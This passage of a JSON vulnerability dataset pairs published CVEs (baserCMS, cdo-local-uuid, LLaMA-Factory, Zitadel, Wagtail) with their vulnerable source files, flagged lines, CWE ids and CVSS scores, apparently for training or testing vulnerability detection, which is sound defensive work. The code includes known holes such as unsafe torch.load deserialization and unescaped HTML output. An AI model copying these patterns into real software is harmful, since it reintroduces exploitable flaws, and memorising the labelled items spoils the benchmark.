__d('baser_core', '日付'), 'class' => 'bca-datetimepicker__date-label'],\n                        'timeInput' => ['class' => 'bca-datetimepicker__time-input'],\n                        'timeDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__time'],\n                        'timeLabel' => ['text' => '時間', 'class' => 'bca-datetimepicker__time-label']\n                    ], $options);\n                    break;\n                case 'text':\n                case 'password':\n                case 'date':\n                case 'datePicker':\n                case 'tel':\n                case 'email':\n                case 'number':\n                    $class = 'bca-textbox__input';\n                    $containerClass = 'bca-textbox';\n                    $labelClass = 'bca-textbox__label';\n                    break;\n                case 'textarea':\n                    $class = 'bca-textarea__textarea';\n                    $containerClass = 'bca-textarea';\n                    break;\n                case 'checkbox':\n                    $options['templateVars']['labelClass'] = 'bca-checkbox__label';\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    if(empty($options['label'])) $options['label'] = '';\n                    break;\n                case 'multiCheckbox':\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    $groupContainerClass = 'bca-checkbox-group';\n                    break;\n                case 'select':\n                    $class = 'bca-select__select';\n                    $containerClass = 'bca-select';\n                    break;\n                case 'radio':\n                    $class = 'bca-radio__input';\n                    $containerClass = 'bca-radio';\n                    $labelClass = 'bca-radio__label';\n                    $groupContainerClass = 'bca-radio-group';\n                    break;\n            }\n\n            if (!isset($options['class'])) {\n                $options['class'] = $class;\n            }\n            if (!isset($options['labelOptions'])) {\n                if (!empty($options['label']) && $options['label'] !== true) {\n                    $options['labelOptions'] = ['text' => $options['label'], 'class' => $labelClass];\n                } else {\n                    $options['labelOptions'] = ['class' => $labelClass];\n                }\n            }\n            if ($containerClass) {\n                $options['templateVars']['class'] = $containerClass;\n            }\n            if ($groupContainerClass) {\n                $options['templateVars']['groupClass'] = $groupContainerClass;\n            }\n\n        }\n\n        return parent::control($fieldName, $options);\n    }\n\n    /**\n     * postLink\n     * CSSクラスに bca-submit-token を追加する\n     * @param string $title\n     * @param null $url\n     * @param array $options\n     * @return string\n     * @checked\n     * @noTodo\n     * @unitTest\n     */\n    public function postLink(string $title, $url = null, array $options = []): string\n    {\n        $class = 'bca-submit-token';\n        if(!empty($options['class'])) {\n            $classes = explode(' ', $options['class']);\n            if(!in_array($class, $classes)) {\n                $classes[] = $class;\n            }\n            $options['class'] = implode(' ', $classes);\n        } else {\n                $options['class'] = $class;\n        }\n        return parent::postLink($title, $url, $options);\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "public function control(string $fieldName, array $options = []): string\n    {\n        if (empty($options['type'])) {\n            $options['type'] = $this->_inputType($fieldName, $options);\n        }\n        if (!empty($options['type'])) {\n            $options = array_replace_recursive([\n                'label' => false,\n                'legend' => false,\n                'error' => false,\n                'templateVars' => ['tag' => 'span', 'groupTag' => 'span']\n            ], $options);\n            $class = 'bca-hidden__input';\n            $containerClass = 'bca-hidden';\n            $labelClass = $groupContainerClass = $label = '';\n            switch($options['type']) {\n                case 'file':\n                    $class = 'bca-file__input';\n                    $containerClass = 'bca-file';\n                    $options = array_replace_recursive([\n                        'link' => ['class' => 'bca-file__link'],\n                        'class' => 'bca-file__input',\n                        'templateVars' => ['tag' => 'span', 'class' => 'bca-file'],\n                        'deleteSpan' => ['class' => 'bca-file__delete'],\n                        'deleteCheckbox' => ['class' => 'bca-file__delete-input', 'id' => true],\n                        'deleteLabel' => ['class' => 'bca-file__delete-label'],\n                        'figure' => ['class' => 'bca-file__figure'],\n                        'img' => ['class' => 'bca-file__img'],\n                        'figcaption' => ['class' => 'bca-file__figcaption']\n                    ], $options);\n                    break;\n                case 'dateTimePicker':\n                    $containerClass = 'bca-datetimepicker';\n                    $options = array_replace_recursive([\n                        'dateInput' => ['class' => 'bca-datetimepicker__date-input'],\n                        'dateDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__date'],\n                        'dateLabel' => ['text' => __d('baser_core', '日付'), 'class' => 'bca-datetimepicker__date-label'],\n                        'timeInput' => ['class' => 'bca-datetimepicker__time-input'],\n                        'timeDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__time'],\n                        'timeLabel' => ['text' => '時間', 'class' => 'bca-datetimepicker__time-label']\n                    ], $options);\n                    break;\n                case 'text':\n                case 'password':\n                case 'date':\n                case 'datePicker':\n                case 'tel':\n                case 'email':\n                case 'number':\n                    $class = 'bca-textbox__input';\n                    $containerClass = 'bca-textbox';\n                    $labelClass = 'bca-textbox__label';\n                    break;\n                case 'textarea':\n                    $class = 'bca-textarea__textarea';\n                    $containerClass = 'bca-textarea';\n                    break;\n                case 'checkbox':\n                    $options['templateVars']['labelClass'] = 'bca-checkbox__label';\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    if(empty($options['label'])) $options['label'] = '';\n                    break;\n                case 'multiCheckbox':\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    $groupContainerClass = 'bca-checkbox-group';\n                    break;\n                case 'select':\n                    $class = 'bca-select__select';\n                    $containerClass = 'bca-select';\n                    break;\n                case 'radio':\n                    $class = 'bca-radio__input';\n                    $containerClass = 'bca-radio';\n                    $labelClass = 'bca-radio__label';\n                    $groupContainerClass = 'bca-radio-group';\n                    break;\n            }\n\n            if (!isset($options['class'])) {\n                $options['class'] = $class;\n            }\n            if (!isset($options['labelOptions'])) {\n                if (!empty($options['label']) && $options['label'] !== true) {\n                    $options['labelOptions'] = ['text' => $options['label'], 'class' => $labelClass];\n                } else {\n                    $options['labelOptions'] = ['class' => $labelClass];\n                }\n            }\n            if ($containerClass) {\n                $options['templateVars']['class'] = $containerClass;\n            }\n            if ($groupContainerClass) {\n                $options['templateVars']['groupClass'] = $groupContainerClass;\n            }\n\n        }\n\n        return parent::control($fieldName, $options);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "                        'figcaption' => ['class' => 'bca-file__figcaption']"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 58,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.1\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, an environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 90,
          "content": "        try:"
        },
        {
          "line_no": 96,
          "content": "        except ValueError:"
        },
        {
          "line_no": 97,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 98,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 129,
    "cve": "CVE-2025-46567",
    "description": "LLama Factory enables fine-tuning of large language models. Prior to version 1.0.0, a critical vulnerability exists in the `llamafy_baichuan2.py` script of the LLaMA-Factory project. The script performs insecure deserialization using `torch.load()` on user-supplied `.bin` files from an input directory. An attacker can exploit this behavior by crafting a malicious `.bin` file that executes arbitrary commands during deserialization. This issue has been patched in version 1.0.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "scripts/convert_ckpt/llamafy_baichuan2.py",
          "content": "# Copyright 2025 the LlamaFactory team.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport os\nfrom collections import OrderedDict\nfrom typing import Any\n\nimport fire\nimport torch\nfrom huggingface_hub import split_torch_state_dict_into_shards\nfrom safetensors.torch import save_file\nfrom tqdm import tqdm\nfrom transformers.modeling_utils import SAFE_WEIGHTS_INDEX_NAME, SAFE_WEIGHTS_NAME, WEIGHTS_INDEX_NAME, WEIGHTS_NAME\n\n\nCONFIG_NAME = \"config.json\"\n\n\ndef save_weight(input_dir: str, output_dir: str, shard_size: str, save_safetensors: bool):\n    baichuan2_state_dict: dict[str, torch.Tensor] = OrderedDict()\n    for filepath in tqdm(os.listdir(input_dir), desc=\"Load weights\"):\n        if os.path.isfile(os.path.join(input_dir, filepath)) and filepath.endswith(\".bin\"):\n            shard_weight = torch.load(os.path.join(input_dir, filepath), map_location=\"cpu\")\n            baichuan2_state_dict.update(shard_weight)\n\n    llama_state_dict: dict[str, torch.Tensor] = OrderedDict()\n    for key, value in tqdm(baichuan2_state_dict.items(), desc=\"Convert format\"):\n        if \"W_pack\" in key:\n            proj_size = value.size(0) // 3\n            llama_state_dict[key.replace(\"W_pack\", \"q_proj\")] = value[:proj_size, :]\n            llama_state_dict[key.replace(\"W_pack\", \"k_proj\")] = value[proj_size : 2 * proj_size, :]\n            llama_state_dict[key.replace(\"W_pack\", \"v_proj\")] = value[2 * proj_size :, :]\n        elif \"lm_head\" in key:\n            llama_state_dict[key] = torch.nn.functional.normalize(value)\n        else:\n            llama_state_dict[key] = value\n\n    weights_name = SAFE_WEIGHTS_NAME if save_safetensors else WEIGHTS_NAME\n    filename_pattern = weights_name.replace(\".bin\", \"{suffix}.bin\").replace(\".safetensors\", \"{suffix}.safetensors\")\n    state_dict_split = split_torch_state_dict_into_shards(\n        llama_state_dict, filename_pattern=filename_pattern, max_shard_size=shard_size\n    )\n    for shard_file, tensors in tqdm(state_dict_split.filename_to_tensors.items(), desc=\"Save weights\"):\n        shard = {tensor: llama_state_dict[tensor].contiguous() for tensor in tensors}\n        if save_safetensors:\n            save_file(shard, os.path.join(output_dir, shard_file), metadata={\"format\": \"pt\"})\n        else:\n            torch.save(shard, os.path.join(output_dir, shard_file))\n\n    if not state_dict_split.is_sharded:\n        print(f\"Model weights saved in {os.path.join(output_dir, weights_name)}.\")\n    else:\n        index = {\n            \"metadata\": state_dict_split.metadata,\n            \"weight_map\": state_dict_split.tensor_to_filename,\n        }\n        index_name = SAFE_WEIGHTS_INDEX_NAME if save_safetensors else WEIGHTS_INDEX_NAME\n        with open(os.path.join(output_dir, index_name), \"w\", encoding=\"utf-8\") as f:\n            json.dump(index, f, indent=2, sort_keys=True)\n\n        print(f\"Model weights saved in {output_dir}.\")\n\n\ndef save_config(input_dir: str, output_dir: str):\n    with open(os.path.join(input_dir, CONFIG_NAME), encoding=\"utf-8\") as f:\n        llama3_config_dict: dict[str, Any] = json.load(f)\n\n    llama3_config_dict[\"architectures\"] = [\"LlamaForCausalLM\"]\n    llama3_config_dict.pop(\"auto_map\", None)\n    llama3_config_dict.pop(\"tokenizer_class\", None)\n    llama3_config_dict[\"model_type\"] = \"llama\"\n\n    with open(os.path.join(output_dir, CONFIG_NAME), \"w\", encoding=\"utf-8\") as f:\n        json.dump(llama3_config_dict, f, indent=2)\n\n    print(f\"Model config saved in {os.path.join(output_dir, CONFIG_NAME)}\")\n\n\ndef llamafy_baichuan2(\n    input_dir: str,\n    output_dir: str,\n    shard_size: str = \"2GB\",\n    save_safetensors: bool = True,\n):\n    r\"\"\"Convert the Baichuan2-7B model in the same format as LLaMA2-7B.\n\n    Usage: python llamafy_baichuan2.py --input_dir input --output_dir output\n    Converted model: https://huggingface.co/hiyouga/Baichuan2-7B-Base-LLaMAfied\n    \"\"\"\n    try:\n        os.makedirs(output_dir, exist_ok=False)\n    except Exception as e:\n        raise print(\"Output dir already exists\", e)\n\n    save_weight(input_dir, output_dir, shard_size, save_safetensors)\n    save_config(input_dir, output_dir)\n\n\nif __name__ == \"__main__\":\n    fire.Fire(llamafy_baichuan2)\n"
        }
      ],
      "method_level": [
        "def save_weight(input_dir: str, output_dir: str, shard_size: str, save_safetensors: bool):\n    baichuan2_state_dict: dict[str, torch.Tensor] = OrderedDict()\n    for filepath in tqdm(os.listdir(input_dir), desc=\"Load weights\"):\n        if os.path.isfile(os.path.join(input_dir, filepath)) and filepath.endswith(\".bin\"):\n            shard_weight = torch.load(os.path.join(input_dir, filepath), map_location=\"cpu\")\n            baichuan2_state_dict.update(shard_weight)\n\n    llama_state_dict: dict[str, torch.Tensor] = OrderedDict()\n    for key, value in tqdm(baichuan2_state_dict.items(), desc=\"Convert format\"):\n        if \"W_pack\" in key:\n            proj_size = value.size(0) // 3\n            llama_state_dict[key.replace(\"W_pack\", \"q_proj\")] = value[:proj_size, :]\n            llama_state_dict[key.replace(\"W_pack\", \"k_proj\")] = value[proj_size : 2 * proj_size, :]\n            llama_state_dict[key.replace(\"W_pack\", \"v_proj\")] = value[2 * proj_size :, :]\n        elif \"lm_head\" in key:\n            llama_state_dict[key] = torch.nn.functional.normalize(value)\n        else:\n            llama_state_dict[key] = value\n\n    weights_name = SAFE_WEIGHTS_NAME if save_safetensors else WEIGHTS_NAME\n    filename_pattern = weights_name.replace(\".bin\", \"{suffix}.bin\").replace(\".safetensors\", \"{suffix}.safetensors\")\n    state_dict_split = split_torch_state_dict_into_shards(\n        llama_state_dict, filename_pattern=filename_pattern, max_shard_size=shard_size\n    )\n    for shard_file, tensors in tqdm(state_dict_split.filename_to_tensors.items(), desc=\"Save weights\"):\n        shard = {tensor: llama_state_dict[tensor].contiguous() for tensor in tensors}\n        if save_safetensors:\n            save_file(shard, os.path.join(output_dir, shard_file), metadata={\"format\": \"pt\"})\n        else:\n            torch.save(shard, os.path.join(output_dir, shard_file))\n\n    if not state_dict_split.is_sharded:\n        print(f\"Model weights saved in {os.path.join(output_dir, weights_name)}.\")\n    else:\n        index = {\n            \"metadata\": state_dict_split.metadata,\n            \"weight_map\": state_dict_split.tensor_to_filename,\n        }\n        index_name = SAFE_WEIGHTS_INDEX_NAME if save_safetensors else WEIGHTS_INDEX_NAME\n        with open(os.path.join(output_dir, index_name), \"w\", encoding=\"utf-8\") as f:\n            json.dump(index, f, indent=2, sort_keys=True)\n\n        print(f\"Model weights saved in {output_dir}.\")"
      ],
      "hunk_level": [
        {
          "line_no": 35,
          "content": "            shard_weight = torch.load(os.path.join(input_dir, filepath), map_location=\"cpu\")"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1039,
    "cve": "CVE-2024-41953",
    "description": "Zitadel is an open source identity management system. ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code. This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email. On the user's detail page, the username was also not sanitized and would also render HTML, giving an attacker the same vulnerability. While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI. This vulnerability is fixed in 2.58.1, 2.57.1, 2.56.2, 2.55.5, 2.54.8 2.53.9, and 2.52.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "internal/notification/templates/templateData.go",
          "content": "package templates\n\nimport (\n\t\"fmt\"\n\t\"html\"\n\n\t\"github.com/zitadel/zitadel/internal/domain\"\n\t\"github.com/zitadel/zitadel/internal/i18n\"\n)\n\nconst (\n\tDefaultFontFamily      = \"-apple-system, BlinkMacSystemFont, Segoe UI, Lato, Arial, Helvetica, sans-serif\"\n\tDefaultFontColor       = \"#22292f\"\n\tDefaultBackgroundColor = \"#fafafa\"\n\tDefaultPrimaryColor    = \"#5282C1\"\n)\n\ntype TemplateData struct {\n\tTitle           string\n\tPreHeader       string\n\tSubject         string\n\tGreeting        string\n\tText            string\n\tURL             string\n\tButtonText      string\n\tPrimaryColor    string\n\tBackgroundColor string\n\tFontColor       string\n\tLogoURL         string\n\tFontURL         string\n\tFontFaceFamily  string\n\tFontFamily      string\n\n\tIncludeFooter bool\n\tFooterText    string\n}\n\nfunc (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}\n"
        }
      ],
      "method_level": [
        "func (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  },
  {
    "id": 963,
    "cve": "CVE-2024-39317",
    "description": "Wagtail is an open source content management system built on Django. A bug in Wagtail's `parse_query_string` would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, `parse_query_string` would take an unexpectedly large amount of time to process, resulting in a denial of service. In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses `parse_query_string`, it may be exploitable by other users (e.g. unauthenticated users). Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "wagtail/search/utils.py",
          "content": "import operator\nimport re\nfrom functools import partial\n\nfrom django.apps import apps\nfrom django.db import connections\nfrom django.http import QueryDict\n\nfrom wagtail.search.index import RelatedFields, SearchField\n\nfrom .query import MATCH_NONE, Phrase, PlainText\n\nNOT_SET = object()\n\n\ndef balanced_reduce(operator, seq, initializer=NOT_SET):\n    \"\"\"\n    Has the same result as Python's reduce function, but performs the calculations in a different order.\n\n    This is important when the operator is constructing data structures such as search query classes.\n    This method will make the resulting data structures flatter, so operations that need to traverse\n    them don't end up crashing with recursion errors.\n\n    For example:\n\n    Python's builtin reduce() function will do the following calculation:\n\n    reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    (1 + (2 + (3 + (4 + (5 + (6 + (7 + 8)))))))\n\n    When using this with query classes, it would create a large data structure with a depth of 7\n    Whereas balanced_reduce will execute this like so:\n\n    balanced_reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    ((1 + 2) + (3 + 4)) + ((5 + 6) + (7 + 8))\n\n    Which only has a depth of 2\n    \"\"\"\n    # Casting all iterables to list makes the implementation simpler\n    if not isinstance(seq, list):\n        seq = list(seq)\n\n    # Note, it needs to be possible to use None as an initial value\n    if initializer is not NOT_SET:\n        if len(seq) == 0:\n            return initializer\n        else:\n            return operator(initializer, balanced_reduce(operator, seq))\n\n    if len(seq) == 0:\n        raise TypeError(\"reduce() of empty sequence with no initial value\")\n    elif len(seq) == 1:\n        return seq[0]\n    else:\n        break_point = len(seq) // 